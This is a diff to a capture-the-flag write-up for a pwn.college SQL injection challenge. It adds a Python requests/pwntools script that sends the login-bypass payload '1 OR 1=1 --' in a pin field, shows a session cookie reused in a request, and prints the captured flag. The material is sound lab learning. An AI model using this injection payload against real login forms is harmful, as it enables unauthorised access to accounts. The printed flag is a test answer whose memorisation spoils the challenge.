@@ -6,6 +6,7 @@
 ---
 
 ## ✅ what i did  
+I WAY -> netcat
 -clicked start
 -opened the terminal
 -ran: 'cat /challenge/server'
@@ -31,6 +32,27 @@ sqlite execute the following query: SELECT rowid, * FROM users WHERE username = 
         'Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aZI9oA.ZFlKAAyE2LKIXQBH_g-7c6_PAVE'
 -flag popped out
 
+II WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed:         '#!/usr/bin/env python3'
+                'import requests'
+                'from pwn import *'
+                'context.log_level = 'error''
+                'url = "http://challenge.localhost:80/credentials"'
+                'p = process("/challenge/server")'
+                'time.sleep(1)'
+                'data = {'
+                        '"login-name" : "admin",'
+                        '"pin" : "1 OR 1=1 --"'
+                        '}'
+                'r = requests.post(url, data=data)'
+                'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
 ## 🧑🏾‍🏫 what this challenge teaches u
 how to perform a basic SQLi
 in this case u just need to add OR 1=1 -- in the pin field
@@ -42,6 +64,10 @@ in this case u just need to add OR 1=1 -- in the pin field
     pin is wrong making the first condition FALSE but 1=1 makes it TRUE thanks to the OR
   5- to escape the last ' use -- to comment it out
 once got the cookie session, u just need to make a GET request including the cookie
+on python when u perform a post requests, inside parentheses data stands for body
+ultimately python allows redirects by default. this means u just need to perform one single request to get the flag
+because is stores automatically the cookie session and sends it in the next requests due to allow_redirects=True
+to disable this, in the post requests write: allow_redirects=False
 
 ## 🏁 Flag  
 pwn.college{QHe9pXvG8ZE2VlPbpMZo8LObeKn.QXzcTN2wCO4IDOxEzW}
